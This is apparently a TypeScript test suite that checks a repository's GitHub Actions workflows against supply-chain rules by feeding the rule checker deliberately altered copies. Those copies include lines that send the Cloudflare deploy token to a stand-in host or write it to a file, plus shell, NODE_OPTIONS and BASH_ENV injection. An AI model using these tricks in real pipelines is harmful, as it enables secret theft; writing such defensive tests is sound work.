// The GitHub Actions workflows (.github/workflows/) against the rules in
// test/workflows.ts, and the files of the repository that the deploy job
// reads or that change what it installs.
//
// This guards against slips and plain changes; it does not replace reading
// each line of a change to the workflows (CONTRIBUTING.md, "部署會執行到的東西").
// test/workflows.ts lists what it does not see. Each altered copy below is
// a change the rules must turn away; all of them are.
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, readFileSync, readdirSync, statSync } from "node:fs";
import { dirname, join, relative, resolve, sep } from "node:path";
import { test } from "node:test";
import { unstable_readConfig } from "wrangler";
import { WORKER_DIR } from "./build.ts";
import {
  ANDROID_SDK_PARTS,
  BB_AMD64_LINUX_SHA256,
  BROWSER_PATHS,
  CHECK_BB,
  GRADLE_BUILD,
  GRADLE_DISTRIBUTION_SHA256,
  GRADLE_VERSION,
  GRADLE_WRAPPER_JAR_SHA256,
  INSTALL_PNPM,
  type Yaml,
  readYaml,
  workflowProblems,
} from "./workflows.ts";

const REPO = join(WORKER_DIR, "..");
const WORKFLOWS_DIR = join(REPO, ".github", "workflows");

function realFiles(): Record<string, string> {
  return Object.fromEntries(readdirSync(WORKFLOWS_DIR).map((f) => [f, readFileSync(join(WORKFLOWS_DIR, f), "utf8")]));
}

test("the workflows keep to the rules", () => {
  assert.deepEqual(workflowProblems(realFiles()), []);
});

const D = "deploy-test.yml";
const C = "checks.yml";
const B = "checks-browser.yml";
const BROWSER_JOB = "  browser:\n    runs-on: ubuntu-24.04\n";
const SHA = "0123456789abcdef0123456789abcdef01234567";
const SECRET = "${{ secrets.CLOUDFLARE_API_TOKEN_TEST }}";
const UPLOAD_ENV = `        env:\n          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN_TEST }}\n          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n`;
const INSTALL_WRANGLER = "        run: pnpm install --frozen-lockfile --ignore-scripts --ignore-pnpmfile --registry=https://registry.npmjs.org/ --filter iamreal-worker\n";
const UPLOAD_RUN = "        run: WRANGLER_SEND_METRICS=false WRANGLER_HIDE_BANNER=true node_modules/.bin/wrangler deploy";
const DOWNLOAD = "      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n";
const BUILD_JOB = "  build:\n    runs-on: ubuntu-24.04\n";
const DEPLOY_JOB = "  deploy:\n    needs: build\n";
const GO_JOB = "  go:\n    runs-on: ubuntu-24.04\n";

type Change = (files: Record<string, string>) => void;
/** Replaces the first `from` in `file`; fails if it is not there, so a change never quietly does nothing. */
const replace =
  (file: string, from: string, to: string): Change =>
  (files) => {
    assert.ok(files[file]!.includes(from), `${file} has no ${JSON.stringify(from)}`);
    files[file] = files[file]!.replace(from, to);
  };
const addFile =
  (file: string, text: string): Change =>
  (files) => {
    files[file] = text;
  };

/** Changes the rules must turn away. 01 to 35 are the review's (#39); the rest are added here. */
const CHANGES: Record<string, Change[]> = {
  "01 a secret after ' #' inside a quoted run, in the build job": [replace(D, "      - run: pnpm install --frozen-lockfile\n", `      - run: pnpm install --frozen-lockfile\n      - run: 'curl "https://example.invalid/ #${SECRET}"'\n`)],
  "02 a secret after ' #' in checks.yml": [replace(C, "      - run: go build ./...", `      - run: 'curl "https://example.invalid/ #${SECRET}"'\n      - run: go build ./...`)],
  "03 a step written with a bare '-' after the upload holds the token and runs something else": [
    replace(D, UPLOAD_ENV, ""),
    replace(D, UPLOAD_RUN, `${UPLOAD_ENV.replace(SECRET, "x")}${UPLOAD_RUN}`),
    (f) => {
      f[D] += `      -\n${UPLOAD_ENV}        run: node scripts/anything.js\n`;
    },
  ],
  "04 shell: in the last step": [replace(D, UPLOAD_RUN, `        shell: bash -c "node scripts/anything.js; bash {0}"\n${UPLOAD_RUN}`)],
  "05 defaults: at the top": [replace(D, "jobs:\n", 'defaults:\n  run:\n    shell: bash -c "node scripts/anything.js; bash {0}"\n\njobs:\n')],
  "06 the last step's working-directory changed": [replace(D, "        working-directory: worker\n        env:", "        working-directory: elsewhere\n        env:")],
  "07 more env in the last step (NODE_OPTIONS, CLOUDFLARE_API_BASE_URL)": [
    replace(D, UPLOAD_ENV, `${UPLOAD_ENV}          NODE_OPTIONS: --require ./scripts/anything.cjs\n          CLOUDFLARE_API_BASE_URL: https://example.invalid/client/v4\n`),
  ],
  "08 BASH_ENV at the top": [replace(D, "jobs:\n", "env:\n  BASH_ENV: scripts/anything.sh\n\njobs:\n")],
  "09 the last step's run continued on the next line": [(f) => void (f[D] = f[D]!.replace(/(--env-file=\/dev\/null\n)$/, "$1          ; node scripts/anything.js\n"))],
  "10 a quoted key \"uses\" with a tag": [replace(D, DOWNLOAD, '      - "uses": actions/download-artifact@v8\n')],
  "11 'uses :' with a space, a tag": [replace(D, DOWNLOAD, "      - uses : actions/download-artifact@v8\n")],
  "12 a flow mapping - { uses: x@tag }": [replace(D, DOWNLOAD, `      - { uses: some/action@main }\n${DOWNLOAD}`)],
  "13 a new workflow: escaped pull_request_target, write-all": [addFile("third.yml", 'name: third\non:\n  "pull_request\\x5ftarget":\npermissions: write-all\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n')],
  "14 a new workflow: on issue_comment and workflow_dispatch, write-all": [addFile("third.yml", "name: third\non: [issue_comment, workflow_dispatch]\npermissions: write-all\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "15 permissions: write-all in the deploy job": [replace(D, DEPLOY_JOB, `${DEPLOY_JOB}    permissions: write-all\n`)],
  "16 a quoted \"permissions\" in a job of checks.yml": [replace(C, GO_JOB, '  go:\n    "permissions": write-all\n    runs-on: ubuntu-24.04\n')],
  "17 before the upload: npm ci": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: npm ci\n`)],
  "18 before the upload: bash scripts/x.sh": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: bash scripts/anything.sh\n`)],
  "19 before the upload: pnpm deploy:test": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: pnpm -C worker deploy:test\n`)],
  "20 --ignore-scripts=false": [replace(D, "--ignore-scripts --ignore-pnpmfile", "--ignore-scripts=false --ignore-pnpmfile")],
  "21 the install continued on the next line": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER.trimEnd()}\n          && node scripts/anything.js\n`)],
  "22 an action that runs a script, pinned to a commit": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - uses: actions/github-script@${SHA} # v9.0.0\n        with:\n          script: require("./scripts/anything.cjs")\n`)],
  "23 the deploy job checks out another ref": [replace(D, "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Install wrangler", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          ref: some-other-branch\n      - name: Install wrangler")],
  "24 the build job rewrites index.js before handing it on": [replace(D, "      - uses: actions/upload-artifact@", '      - run: node scripts/anything.js > "$RUNNER_TEMP/worker-build/index.js"\n      - uses: actions/upload-artifact@')],
  "25 the artifact of another run, with github.token": [replace(D, "          path: ${{ runner.temp }}/worker-build\n      # The build's", "          path: ${{ runner.temp }}/worker-build\n          run-id: 123\n          github-token: ${{ github.token }}\n      # The build's")],
  "26 an if: on the upload": [replace(D, "      - name: Upload to iamreal-test\n", "      - name: Upload to iamreal-test\n        if: github.actor == 'someone'\n")],
  "30 on: [pull_request] in checks.yml": [replace(C, "on:\n  pull_request:\n", "on: [pull_request]\n")],
  "31 run: | before the upload": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: |\n          echo hi\n`)],
  "32 a job that calls another workflow": [replace(D, DEPLOY_JOB, `  other:\n    uses: ./.github/workflows/x.yml\n${DEPLOY_JOB}`)],
  "33 secrets: inherit": [replace(D, DEPLOY_JOB, `${DEPLOY_JOB}    secrets: inherit\n`)],
  "34 the secrets in the job's env, after the steps": [
    replace(D, UPLOAD_ENV, ""),
    (f) => {
      f[D] += `    env:\n      CLOUDFLARE_API_TOKEN: ${SECRET}\n      CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n`;
    },
  ],
  "35 pull_request_target in a new file": [addFile("third.yml", "name: third\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "40 the install of wrangler runs a .pnpmfile.cjs": [replace(D, " --ignore-pnpmfile", "")],
  "41 pnpm installed after the checkout in the deploy job": [
    replace(D, "      - name: Install pnpm\n        run: npm install --global --ignore-scripts --registry=https://registry.npmjs.org/ pnpm@10.16.1\n      # wrangler.jsonc", "      # wrangler.jsonc"),
    replace(D, "      - name: Install wrangler\n", `      - name: Install pnpm\n        run: ${INSTALL_PNPM}\n      - name: Install wrangler\n`),
  ],
  "42 the upload loads .env files": [replace(D, " --env-file=/dev/null\n", "\n")],
  "43 the upload bundles again": [replace(D, " --no-bundle", "")],
  "44 the upload through a script of the repository": [replace(D, UPLOAD_RUN, "        run: node --experimental-strip-types scripts/deploy-test.ts #")],
  "45 another Node version in one job": [replace(C, "          node-version: 22.23.4", "          node-version: 22.23.5")],
  "46 another pnpm version in one job": [replace(C, "pnpm@10.16.1", "pnpm@10.16.2")],
  "47 pnpm from the registry .npmrc names": [replace(C, " --registry=https://registry.npmjs.org/ pnpm@", " pnpm@")],
  "48 a secret mentioned in a comment": [replace(C, "jobs:\n", `# \${{ secrets.X }}\njobs:\n`)],
  "49 a tab": [replace(C, "    timeout-minutes: 30\n", "    timeout-minutes:\t30\n")],
  "50 a document marker": [(f) => void (f[C] = `---\n${f[C]}`)],
  "51 an anchor and an alias": [replace(C, "      - run: go build ./...", "      - run: &x go build ./...\n      - run: *x")],
  "52 a merge key": [replace(C, GO_JOB, `${GO_JOB}    <<: {}\n`)],
  "53 a double-quoted value with an escape": [replace(C, "      - run: go build ./...", '      - run: "go build ./...\\x3b node x.js"')],
  "54 a local action": [replace(C, "      - run: go build ./...", "      - uses: ./.github/actions/x")],
  "55 a container action": [replace(C, "      - run: go build ./...", "      - uses: docker://alpine:3")],
  "56 an env in a step of checks.yml": [replace(C, "      - run: go build ./...", "      - run: go build ./...\n        env:\n          X: y")],
  "57 container: in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    container: some/image\n`)],
  "58 checks.yml also on push": [replace(C, "on:\n  pull_request:\n", "on:\n  pull_request:\n  push:\n")],
  "59 the deploy also on workflow_dispatch": [replace(D, "on:\n  push:\n", "on:\n  workflow_dispatch:\n  push:\n")],
  "60 checks.yml with write permissions": [replace(C, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "61 a job of checks.yml without the check of bb": [replace(C, '      - name: bb is the one of bb.js 6.0.0\n        run: echo "5bbb', '      - name: bb is the one of bb.js 6.0.0\n        run: echo "0bbb')],
  "62 checkout with a ref in checks.yml": [replace(C, "          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n")],
  "63 a key written twice": [replace(D, BUILD_JOB, `${BUILD_JOB}    runs-on: ubuntu-24.04\n`)],
  "64 a character outside ASCII": [replace(C, "      - run: go build ./...", "      - run: go build ./...\u2028      - run: node x.js")],
  "65 a key with a space before its colon": [replace(C, "    timeout-minutes: 30\n", "    timeout-minutes : 30\n")],
  "66 a step in the build job that a later step depends on, with a secret by another name": [replace(D, "      - run: pnpm install --frozen-lockfile\n", `      - run: pnpm install --frozen-lockfile\n        env:\n          T: \${{ secrets.OTHER }}\n`)],
  "67 another directory in a step of checks-browser.yml": [replace(B, "        working-directory: web\n        run: pnpm fetch-crs", "        working-directory: ..\n        run: pnpm fetch-crs")],
  "80 paths in checks.yml": [replace(C, "on:\n  pull_request:\n", "on:\n  pull_request:\n    paths:\n      - web/**\n")],
  "81 paths in deploy-test.yml": [replace(D, "    branches:\n      - main\n", "    branches:\n      - main\n    paths:\n      - worker/**\n")],
  "82 paths-ignore in checks-browser.yml": [replace(B, "    paths:\n", "    paths-ignore:\n")],
  "83 a path less in checks-browser.yml": [replace(B, "      - spec/**\n", "")],
  "84 a path more in checks-browser.yml": [replace(B, "      - web/**\n", "      - web/**\n      - docs/**\n")],
  "85 a negated path in checks-browser.yml": [replace(B, "      - web/**\n", "      - web/**\n      - '!web/README.md'\n")],
  "86 checks-browser.yml on pull_request_target": [replace(B, "  pull_request:\n", "  pull_request_target:\n")],
  "87 checks-browser.yml also on push": [replace(B, "on:\n", "on:\n  push:\n")],
  "88 checks-browser.yml in the concurrency group of checks.yml": [replace(B, "  group: checks-browser-", "  group: checks-")],
  "89 checks-browser.yml without cancelling the run before": [replace(B, "  cancel-in-progress: true\n", "  cancel-in-progress: false\n")],
  "90 permissions in the job of checks-browser.yml": [replace(B, BROWSER_JOB, `${BROWSER_JOB}    permissions: write-all\n`)],
  "91 checks-browser.yml with write permissions": [replace(B, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "92 a secret in the job's env of checks-browser.yml": [replace(B, "      CHROME: /usr/bin/google-chrome\n", "      CHROME: /usr/bin/google-chrome\n      T: ${{ secrets.X }}\n")],
  "93 checkout with a ref in checks-browser.yml": [replace(B, "          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n")],
  "94 an action not in the list in checks-browser.yml": [replace(B, "      - name: Chrome\n", `      - uses: actions/github-script@${SHA} # v9.0.0\n      - name: Chrome\n`)],
  "95 CHROME back in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    env:\n      CHROME: /usr/bin/google-chrome\n`)],
  "96 the WRANGLER values in checks-browser.yml": [replace(B, "env:\n  # bb", 'env:\n  WRANGLER_SEND_METRICS: "false"\n  # bb')],
  "97 a fourth workflow": [addFile("checks-other.yml", "name: other\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "98 a job of checks-browser.yml without the check of bb": [replace(B, '        run: echo "5bbb', '        run: echo "0bbb')],
  "99 a job of checks.yml other than device-core without the check of bb": [replace(C, "\n  device-core:\n", "\n  device-core-2:\n")],
  "100 a step of the device-core job in another directory": [replace(C, "        working-directory: device-core\n        run: cargo fmt --check", "        working-directory: device-core/vendor\n        run: cargo fmt --check")],
  "101 the device-core job taking Barretenberg without the script": [replace(C, 'run: BB_LIB_DIR="$(./fetch-barretenberg.sh)" && export BB_LIB_DIR && cargo test', "run: BARRETENBERG_VERSION=6.0.0 cargo test")],
  "102 cargo of the device-core job run from the root, where .cargo/config.toml is not read": [replace(C, "        working-directory: device-core\n        run: BB_LIB_DIR=\"$(./fetch-barretenberg.sh)\" && export BB_LIB_DIR && cargo test --locked --release", "        run: cargo test --locked --release --manifest-path device-core/Cargo.toml")],
  "103 a second BB_LIB_DIR after the script": [replace(C, "export BB_LIB_DIR && cargo test", "export BB_LIB_DIR && BB_LIB_DIR=/x cargo test")],
  "104 one more step in the device-core job": [replace(C, "      - name: cargo fmt --check\n", "      - run: rm .cargo/config.toml\n        working-directory: device-core\n      - name: cargo fmt --check\n")],
  "105 a job of checks.yml other than device-core and android without the check of bb": [replace(C, "\n  android:\n", "\n  android-2:\n")],
  "106 the android job running a Gradle that is not the wrapper": [replace(C, `run: ${GRADLE_BUILD}`, 'run: JAVA_HOME="$JAVA_HOME_17_X64" gradle build')],
  "107 the android job running the wrapper with something more": [replace(C, `run: ${GRADLE_BUILD}`, `run: ${GRADLE_BUILD} --init-script x.gradle`)],
  "108 the android job running the wrapper of another directory": [replace(C, `        working-directory: android\n        run: ${GRADLE_BUILD}`, `        working-directory: web\n        run: ${GRADLE_BUILD}`)],
  "109 one more step in the android job": [replace(C, "      - name: gradlew build\n", "      - run: sudo snap install zig\n      - name: gradlew build\n")],
  "110 the android job without the parameter files' script": [replace(C, "        working-directory: device-core\n        run: ./fetch-crs.sh", "        working-directory: device-core\n        run: curl -o vendor/crs/bn254_g2.dat https://example.com/g2.dat")],
};

// Spaces outside ASCII. libyaml takes none of them for a space, so a line that starts with them and
// then `#` is not a comment there but the next line of the value above it: `run` of the upload
// would end with the command after the `#` (review of #39, round 2).
for (const [label, cp] of [
  ["U+00A0", 0xa0],
  ["U+3000", 0x3000],
  ["U+2003", 0x2003],
] as const) {
  const ch = String.fromCodePoint(cp);
  CHANGES[`68 ${label} at the start of a line, then #, after the upload's run`] = [
    (f) => {
      f[D] += `${ch}${ch}#; echo "$CLOUDFLARE_API_TOKEN" > /tmp/x\n`;
    },
  ];
  CHANGES[`69 ${label} before # in an indented line`] = [replace(D, "      - name: Upload to iamreal-test\n", `          ${ch}#; node x.js\n      - name: Upload to iamreal-test\n`)];
  CHANGES[`70 ${label} between a key and its colon`] = [replace(C, "    timeout-minutes: 30\n", `    timeout-minutes${ch}: 30\n`)];
  CHANGES[`71 ${label} in a comment`] = [replace(C, "jobs:\n", `# a comment${ch}with it\njobs:\n`)];
}

for (const [name, changes] of Object.entries(CHANGES)) {
  test(`turned away: ${name}`, () => {
    const files = realFiles();
    for (const change of changes) change(files);
    assert.notDeepEqual(workflowProblems(files), [], "the rules let this change through");
  });
}

test("the reader reads the part of YAML the workflows are written in, values as written", () => {
  const doc = readYaml(realFiles()[C]!) as Record<string, Yaml>;
  assert.deepEqual(doc.on, { pull_request: null });
  assert.deepEqual(Object.keys(doc.jobs as object), ["go", "typescript", "device-core", "android"]);
  const browserDoc = readYaml(realFiles()[B]!) as Record<string, Yaml>;
  // `paths`: a list of strings under pull_request, each as written (`**` is no special character in YAML here).
  const paths = (browserDoc.on as Record<string, Record<string, Yaml>>).pull_request!.paths as string[];
  assert.equal(paths[0], "web/**");
  assert.equal(paths.at(-1), ".github/workflows/checks-browser.yml");
  assert.deepEqual(Object.keys(browserDoc.jobs as object), ["browser"]);
  const browser = (browserDoc.jobs as Record<string, Record<string, Yaml>>).browser!;
  assert.deepEqual(browser.env, { CHROME: "/usr/bin/google-chrome" });
  assert.ok((browser.steps as Record<string, Yaml>[]).some((s) => s.run === '"$CHROME" --version'));
  assert.deepEqual(readYaml("a: 'it''s # not a comment' # a comment\nb:\n  - x\n  - y: z\n    w: v\n"), { a: "it's # not a comment", b: ["x", { y: "z", w: "v" }] });
});

test("every job of checks.yml uses the bb of bb.js 6.0.0: the SHA-256 it checks is that file's", () => {
  // The package is installed for worker/ too (its devDependency), with every platform's bb in it.
  const bb = join(WORKER_DIR, "node_modules", "@aztec-foundation", "bb.js", "build", "amd64-linux", "bb");
  const pkg = JSON.parse(readFileSync(join(WORKER_DIR, "node_modules", "@aztec-foundation", "bb.js", "package.json"), "utf8")) as { version: string };
  assert.equal(pkg.version, "6.0.0");
  assert.equal(createHash("sha256").update(readFileSync(bb)).digest("hex"), BB_AMD64_LINUX_SHA256);
  assert.ok(realFiles()[C]!.includes(`run: ${CHECK_BB}`));
  assert.ok(INSTALL_PNPM.includes("--registry=https://registry.npmjs.org/"));
});

test("deploying runs no command of the repository: the wrangler configuration has no build command", () => {
  // wrangler runs `build.command` before it uploads, with --no-bundle too: getEntry
  // (src/deployment-bundle/entry.ts in wrangler 4.160.1) calls runCustomBuild whatever the flag,
  // and Cloudflare's documentation says the command "will be run as part of `wrangler dev` and
  // `npx wrangler deploy`" (https://developers.cloudflare.com/workers/wrangler/custom-builds/).
  // A command there would run in the step that has the token.
  const config = unstable_readConfig({ config: join(WORKER_DIR, "wrangler.jsonc"), env: "test" });
  assert.equal(config.build.command, undefined);
});

test("the Gradle wrapper of android/ is the one of the Gradle it names: its jar and the distribution's SHA-256 are the published ones", () => {
  const wrapper = join(REPO, "android", "gradle", "wrapper");
  assert.equal(createHash("sha256").update(readFileSync(join(wrapper, "gradle-wrapper.jar"))).digest("hex"), GRADLE_WRAPPER_JAR_SHA256);
  // The whole file, line by line: a second distributionUrl, however it is spelled, is a line more.
  assert.deepEqual(readFileSync(join(wrapper, "gradle-wrapper.properties"), "utf8").split("\n"), [
    "distributionBase=GRADLE_USER_HOME",
    "distributionPath=wrapper/dists",
    `distributionSha256Sum=${GRADLE_DISTRIBUTION_SHA256}`,
    `distributionUrl=https\\://services.gradle.org/distributions/gradle-${GRADLE_VERSION}-bin.zip`,
    "networkTimeout=10000",
    "retries=0",
    "retryBackOffMs=500",
    "validateDistributionUrl=true",
    "zipStoreBase=GRADLE_USER_HOME",
    "zipStorePath=wrapper/dists",
    "",
  ]);
  // Every plugin and library Gradle downloads is checked against the SHA-256 in the repository:
  // no signature stands in for one, and nothing is exempt.
  const verification = readFileSync(join(REPO, "android", "gradle", "verification-metadata.xml"), "utf8");
  assert.ok(verification.includes("<verify-metadata>true</verify-metadata>"));
  assert.ok(verification.includes("<verify-signatures>false</verify-signatures>"));
  assert.ok(!/<trust|<ignored-key|<key-server/.test(verification), "no artifact is exempt from the check");
  assert.ok(!/<(md5|sha1|pgp)\b/.test(verification), "SHA-256 only");
  // The parts of the SDK the job installs are the ones the build names.
  const build = readFileSync(join(REPO, "android", "app", "build.gradle.kts"), "utf8");
  const named = (re: RegExp): string => re.exec(build)![1]!;
  assert.ok(ANDROID_SDK_PARTS.includes(`"ndk;${named(/ndkVersion = "([^"]+)"/)}"`));
  assert.ok(ANDROID_SDK_PARTS.includes(`"platforms;android-${named(/compileSdk = (\d+)/)}"`));
  assert.ok(ANDROID_SDK_PARTS.includes(`"build-tools;${named(/buildToolsVersion = "([^"]+)"/)}"`));
});

test("no file in the repository changes what the deploy job installs or what wrangler loads", () => {
  // .npmrc: where pnpm and npm fetch from, and pnpm's settings. .pnpmfile.cjs: code pnpm runs
  // while installing (the deploy job passes --ignore-pnpmfile too). worker/.env*: wrangler loads
  // them unless --env-file names others (scripts/deploy.ts). patches/: pnpm's patches of packages.
  const tracked = execFileSync("git", ["-C", REPO, "ls-files", "-z"], { encoding: "utf8" }).split("\0").filter(Boolean);
  assert.ok(tracked.includes("pnpm-lock.yaml"), "the check read the tracked files");
  assert.deepEqual(
    tracked.filter((f) => /(^|\/)\.npmrc$|(^|\/)\.pnpmfile\.c?js$|(^|\/)\.pnpmfile\.mjs$|^worker\/(.*\/)?\.env[^/]*$|^patches\//.test(f)),
    [],
  );
});

test("pnpm-workspace.yaml and the lockfile hold no setting that changes the packages installed", () => {
  // patchedDependencies, overrides, packageExtensions, pnpmfile, configDependencies and the like
  // would change wrangler as the deploy job installs it; tried: a patch of wrangler in
  // pnpm-workspace.yaml and the lockfile is applied under --ignore-scripts --ignore-pnpmfile.
  const workspace = readYaml(readFileSync(join(REPO, "pnpm-workspace.yaml"), "utf8")) as Record<string, Yaml>;
  assert.deepEqual(Object.keys(workspace), ["packages", "minimumReleaseAge", "ignoredBuiltDependencies"]);
  const lockKeys = readFileSync(join(REPO, "pnpm-lock.yaml"), "utf8")
    .split("\n")
    .filter((l) => /^[^\s#]/.test(l))
    .map((l) => l.replace(/:.*$/, ""));
  assert.deepEqual(lockKeys, ["lockfileVersion", "settings", "importers", "packages", "snapshots"]);
});

function filesUnder(dir: string): string[] {
  return readdirSync(dir).flatMap((f) => {
    const p = join(dir, f);
    return statSync(p).isDirectory() ? filesUnder(p) : [p];
  });
}

/** The workspace's packages (pnpm-workspace.yaml): each one's name in its package.json, and its directory. */
function workspacePackages(): Map<string, string> {
  const workspace = readYaml(readFileSync(join(REPO, "pnpm-workspace.yaml"), "utf8")) as { packages: string[] };
  const found = new Map<string, string>();
  for (const dir of workspace.packages) {
    const pkg = JSON.parse(readFileSync(join(REPO, dir, "package.json"), "utf8")) as { name: string };
    found.set(pkg.name, join(REPO, dir));
  }
  assert.ok(found.size > 1, "the check read the workspace's packages");
  return found;
}

/**
 * What the browser tests (web/'s `pnpm test:e2e` and `pnpm test:ui`,
 * test/e2e/run.ts and ui.ts) use, found by reading their source, from every
 * file of web/src/, web/test/e2e/, web/vite.config.ts and the pages' HTML
 * in web/ (Vite builds the page from them), and the files those import:
 *
 * - `files`: the files reached by an import written `from "…"`,
 *   `import("…")` or `import "…"` with a relative path (JSON included), or
 *   with the name of a package of the workspace (`iamreal-protocol/…` is
 *   protocol/src/…); and by the HTML's `<script src>`;
 * - `named`: the top-level directories in `join(repo, "<dir>"…)`,
 *   `join(web, "..", "<dir>"…)`, `join(web, "../<dir>"…)` (each also broken
 *   over lines), `new URL("../…", import.meta.url)`, and the directory of a
 *   workspace package imported by name;
 * - `goPackages`: the packages in `"go", [… "./<package>"`.
 *
 * Not seen (tried in the review of #123): a path written as a template
 * string (`${repo}/docs`), joined with `+`, or put together some other way
 * when the tests run; an import with a query (`?raw`); CSS `@import`; a Go
 * package named through a variable; what the programs the tests start read
 * at run time (the Go server reads only the directories the test hands
 * it); npm packages (the lockfile stands for them); the tools on the runner
 * (Chrome, Go, bb). So this is one more reminder, not the list: whoever
 * makes the tests use another directory adds it to the paths.
 */
function readBrowserTests(): { used: Set<string>; goPackages: Set<string> } {
  const web = join(REPO, "web");
  const packages = workspacePackages();
  const roots = [
    ...filesUnder(join(web, "src")),
    ...filesUnder(join(web, "test", "e2e")),
    join(web, "vite.config.ts"),
    ...readdirSync(web)
      .filter((f) => f.endsWith(".html"))
      .map((f) => join(web, f)),
  ].filter((f) => /\.(ts|js|mjs|html)$/.test(f));
  assert.ok(roots.some((f) => f.endsWith("index.html")), "the check read the pages' HTML");
  const top = (path: string): string => relative(REPO, path).split(sep)[0]!;
  const seen = new Set<string>();
  const used = new Set<string>();
  const goPackages = new Set<string>();
  const queue = [...roots];
  while (queue.length > 0) {
    const file = queue.pop()!;
    if (seen.has(file)) continue;
    seen.add(file);
    const text = readFileSync(file, "utf8");
    const specifiers = [
      ...[...text.matchAll(/\b(?:from|import)\s*\(?\s*["']([^"']+)["']/g)].map((m) => m[1]!),
      ...[...text.matchAll(/<script[^>]*\bsrc="([^"]+)"/g)].map((m) => m[1]!.replace(/^\//, "./")),
    ];
    for (const s of specifiers) {
      let target: string | undefined;
      if (s.startsWith(".")) target = resolve(dirname(file), s);
      else {
        const name = [...packages.keys()].find((n) => s === n || s.startsWith(`${n}/`));
        if (name !== undefined) {
          const dir = packages.get(name)!;
          used.add(top(dir));
          const rest = s.slice(name.length + 1);
          // iamreal-protocol's "exports": "./*.ts" is "./src/*.ts".
          target = [join(dir, "src", rest), join(dir, rest)].find((t) => rest !== "" && existsSync(t));
        }
      }
      if (target !== undefined && existsSync(target) && statSync(target).isFile()) queue.push(target);
    }
    for (const m of text.matchAll(/\bjoin\(\s*repo\s*,\s*"([^"/]+)/g)) used.add(m[1]!);
    for (const m of text.matchAll(/\bjoin\(\s*web\s*,\s*"\.\."\s*,\s*"([^"/]+)/g)) used.add(m[1]!);
    for (const m of text.matchAll(/\bjoin\(\s*web\s*,\s*"\.\.\/([^"/]+)/g)) used.add(m[1]!);
    for (const m of text.matchAll(/new URL\(\s*["'`]((?:\.\.\/)+[^"'`$]*)/g)) {
      // `new URL(\`../../${path}\`)` (web/test/vectors.ts) names the repository's root and no more: say so.
      const named = top(resolve(dirname(file), m[1]!));
      used.add(named === "" ? `(somewhere in the repository, by ${relative(REPO, file)})` : named);
    }
    for (const m of text.matchAll(/"go",\s*\[[^\]]*?"(\.\/[\w./-]+)"/g)) goPackages.add(m[1]!);
  }
  for (const f of seen) used.add(top(f));
  return { used, goPackages };
}

/** Whether `top`, a top-level directory or file, is in the paths. */
const inPaths = (top: string): boolean => BROWSER_PATHS.includes(existsSync(join(REPO, top)) && statSync(join(REPO, top)).isDirectory() ? `${top}/**` : top);

test("the browser tests run when anything they use changes: each top-level directory and file their source names is in the paths", () => {
  const { used } = readBrowserTests();
  // The check sees the page, the shared rules and the screen's sentences.
  for (const d of ["web", "protocol", "design", "verifier"]) assert.ok(used.has(d), `the check found ${d}`);
  assert.deepEqual(
    [...used].filter((u) => !inPaths(u)),
    [],
  );
  // What is installed and how: the lockfile and the workspace, and this workflow itself.
  for (const p of ["pnpm-lock.yaml", "pnpm-workspace.yaml", ".github/workflows/checks-browser.yml"]) assert.ok(BROWSER_PATHS.includes(p), p);
});

/** Whether `go` runs here. */
const hasGo = ((): boolean => {
  const r = spawnSync("go", ["version"], { encoding: "utf8" });
  return r.error === undefined && r.status === 0;
})();
// Without Go the test of the Go packages is skipped, on a computer. Where the
// whole check is expected (CI, which GitHub Actions sets, or IAMREAL_BB, set
// where the tests that run bb and Go are meant to run) a missing Go fails it
// instead of skipping it.
const goRequired = Boolean(process.env.CI) || Boolean(process.env.IAMREAL_BB);

test(
  "the browser tests run when the Go programs they build change: the directories of those packages and of every package they import are in the paths",
  { skip: !hasGo && !goRequired ? "go is not installed: the Go packages the browser tests build are not looked at" : false },
  () => {
    assert.ok(hasGo, "go is not installed, and CI or IAMREAL_BB is set: this check must run here");
    const { goPackages } = readBrowserTests();
    assert.ok(goPackages.has("./server") && goPackages.has("./cmd/iamreal-verify"), "the check read the Go builds");
    const format = '{{if .Module}}{{if eq .Module.Path "github.com/iamreal-tw/iamreal"}}{{.Dir}}{{end}}{{end}}';
    const dirs = execFileSync("go", ["list", "-tags", "iamrealtest", "-deps", "-f", format, ...goPackages], { cwd: REPO, encoding: "utf8" });
    const used = new Set(["go.mod", "go.sum", ...dirs.split("\n").filter(Boolean).map((d) => relative(REPO, d).split(sep)[0]!)]);
    for (const d of ["server", "verifier", "cmd", "crl", "roster"]) assert.ok(used.has(d), `the check found ${d}`);
    assert.deepEqual(
      [...used].filter((u) => !inPaths(u)),
      [],
    );
  },
);
